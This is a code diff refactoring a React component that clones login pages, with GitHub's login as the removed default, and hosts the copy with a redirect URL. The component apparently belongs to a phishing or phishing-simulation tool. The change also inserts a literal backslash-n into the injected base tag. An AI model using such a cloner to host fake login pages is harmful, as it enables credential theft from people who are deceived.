@@ -2,7 +2,7 @@
 'use client';
 
 import { useState } from 'react';
-import { useForm } from 'react-hook-form';
+import { useForm, type UseFormReturn } from 'react-hook-form';
 import { zodResolver } from '@hookform/resolvers/zod';
 import { z } from 'zod';
 import {
@@ -32,21 +32,13 @@ const clonerSchema = z.object({
 
 type LoginPageClonerProps = {
   onHostPage: (htmlContent: string, redirectUrl: string) => void;
+  form: UseFormReturn<z.infer<typeof clonerSchema>>;
 };
 
-export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
+export function LoginPageCloner({ onHostPage, form }: LoginPageClonerProps) {
   const { toast } = useToast();
   const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
   const [isProcessing, setIsProcessing] = useState(false);
-
-  const form = useForm<z.infer<typeof clonerSchema>>({
-    resolver: zodResolver(clonerSchema),
-    defaultValues: {
-      redirectUrl: 'https://github.com/password_reset',
-      urlToClone: 'https://github.com/login',
-      htmlContent: '',
-    },
-  });
 
   const resetState = () => {
     setModifiedHtml(null);
@@ -86,7 +78,7 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
       
       if (baseHrefUrl) {
         if (html.includes('<head>')) {
-          html = html.replace(/<head>/i, `<head>\n<base href="${baseHrefUrl}">`);
+          html = html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`);
         } else {
           html = `<head><base href="${baseHrefUrl}"></head>${html}`;
         }
